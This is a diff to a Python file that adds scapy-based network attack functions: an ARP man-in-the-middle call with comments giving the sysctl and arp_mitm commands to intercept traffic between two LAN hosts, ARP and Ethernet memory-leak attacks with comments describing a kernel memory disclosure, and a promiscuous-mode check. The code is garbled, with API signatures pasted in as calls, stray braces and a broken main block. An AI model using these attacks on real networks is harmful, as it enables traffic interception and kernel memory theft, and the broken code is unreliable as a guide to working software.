@@ -2,6 +2,36 @@
 from scapy.layers.l2 import Ether, ARP
 import scapy.all as scapy
 import time
+def attack(): 
+    scapy.layers.l2.arp_mitm(ip1: "0.0.0.0", ip2: "0.0.0.0", mac1: "ff-ff-ff-ff-ff-ff", mac2: "ff-ff-ff-ff-ff-ff",Boradcast: False, target_mac: "ff-ff-ff-ff-ff-ff", iface: "Ethernet2")
+
+#$ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface | default Send_redirects =1, virbr0- for Network Address resolution
+#$ sysctl net.ipv4.ip_forward=1 | default = 0
+#$ sudo scapy
+#>>> arp_mitm("192.168.122.156", "192.168.122.17")
 
 if __name__ == '__main__':
-    
+scapy.layers.l2.getmacbyip(ip: str, chainCC: int = 0)→ str | None
+#mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address- defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
+
+def ARP_Leak_Attack():
+    scapy.layers.l2.arpleak(target: str, plen: int = 255, hwlen: int = 255, **kargs: Any)→ Tuple[SndRcvList, PacketList]
+ # When replying to an ARP request, a particular branch taken in the
+  # output code did not free the mbuf that was being sent. An attacker
+   #could send specially-crafted ARP requests that trigger this memory
+   #leak.
+ #When processing a received ARP request, the system did not properly
+ #  check the hardware and protocol lengths in the ARP header. These fields
+ #  being used to reply to the request in memcpys, an attacker could send
+ #  an ARP packet with the highest encodable lengths and cause the kernel
+ #  to copy in the reply packet more data than is available. It has been
+ #  demonstrated that a remote machine can thereby retrieve 249 bytes of
+ #  kernel memory over an Ethernet link.
+def Ethernet_Leak_Attack():
+    scapy.layers.l2.etherleak(target: str, **kargs: Any)→ Tuple[SndRcvList, PacketList]
+def promisc_mode()
+{
+    #Promiscuous mode is a feature in computer networking that allows a network interface controller (NIC) or wireless network interface controller (WNIC) to capture all network traffic it receives, 
+    #rather than filtering and processing only the frames specifically addressed to it
+    scapy.layers.l2.is_promisc(ip: str, fake_bcast: str = 'ff:ff:00:00:00:00', **kargs: Any)→ bool
+}
